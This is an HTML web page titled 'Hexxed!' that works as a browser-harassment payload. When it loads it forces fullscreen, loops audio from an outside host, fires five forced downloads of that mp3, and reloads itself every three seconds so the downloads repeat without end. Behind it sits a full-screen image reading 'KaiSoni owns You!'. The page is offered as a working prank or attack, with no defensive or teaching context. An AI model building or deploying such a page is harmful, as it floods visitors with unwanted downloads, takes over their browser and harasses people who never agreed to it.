<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Hexxed!</title>
  <style>
    /* Reset default margins and ensure full-screen layout */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    /* Full Screen Popup */
    .fullscreen-popup {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: #000; /* Black background for contrast */
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }
    
    .popup-content {
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    img {
      width: 100%;
      height: 100%;
      object-fit: contain; /* Ensure full image is visible */
      object-position: center; /* Center the image */
      user-select: none;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <div class="fullscreen-popup" id="popup">
    <div class="popup-content">
      <img src="KaiSoni owns You!.png" alt="Fullscreen Image" />
    </div>
  </div>

  <audio id="aud" src="https://jewls-gray.vercel.app/1.mp3" preload="auto" loop></audio>

  <script>
    const popup = document.getElementById('popup');
    const audio = document.getElementById('aud');
    const mp3Url = 'https://jewls-gray.vercel.app/1.mp3';

    // Function to trigger MP3 download
    function triggerDownload(url, filename) {
      const a = document.createElement('a');
      a.href = url;
      a.download = filename || '1.mp3';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }

    // Fullscreen functionality
    function enterFullscreen() {
      const el = document.documentElement;
      if (!el) return;
      if (el.requestFullscreen) {
        el.requestFullscreen().catch(() => {});
      } else if (el.webkitRequestFullscreen) {
        el.webkitRequestFullscreen();
      } else if (el.msRequestFullscreen) {
        el.msRequestFullscreen();
      }
    }

    // Attempt to play audio, handling autoplay restrictions
    function tryPlayAudio() {
      audio.play().catch((error) => {
        console.log('Autoplay prevented:', error);
        document.addEventListener('click', () => {
          audio.play().catch(() => {});
        }, { once: true });
      });
    }

    window.addEventListener('load', () => {
      enterFullscreen();
      tryPlayAudio();

      // Trigger multiple downloads (e.g., 5 times per page load)
      const downloadCount = 5; // Adjust number of downloads
      for (let i = 0; i < downloadCount; i++) {
        setTimeout(() => {
          triggerDownload(mp3Url, `1_${i + 1}.mp3`);
        }, i * 500); // 500ms delay between downloads
      }

      // Refresh page after a delay to repeat downloads
      setTimeout(() => {
        window.location.reload();
      }, 3000); // Refresh every 3 seconds (adjust as needed)
    });

    // Handle visibility change to pause/resume audio
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        audio.pause();
      } else {
        tryPlayAudio();
      }
    });
  </script>
</body>
</html>
